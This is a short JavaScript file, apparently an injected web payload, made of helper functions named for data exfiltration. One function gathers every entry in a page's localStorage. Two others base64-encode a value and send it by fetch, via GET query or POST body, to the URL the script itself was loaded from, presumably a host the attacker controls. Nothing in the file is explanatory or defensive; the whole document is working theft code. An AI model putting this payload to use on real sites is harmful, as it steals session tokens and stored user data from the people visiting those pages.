function exfil(name, value) {
    fetch(document.currentScript.getAttribute('src') + '?' + name + '=' + btoa(unescape(encodeURIComponent(value))))
}

function allStorage() {

    var values = {}, keys = Object.keys(localStorage), i = keys.length;

    while (i--) {
        values[keys[i]] = localStorage.getItem(keys[i]);
    }

    return values;
}

function exfilPost(name, value) {
    fetch(document.currentScript.getAttribute('src'), { method: 'POST', body: btoa(unescape(encodeURIComponent(value))) })
}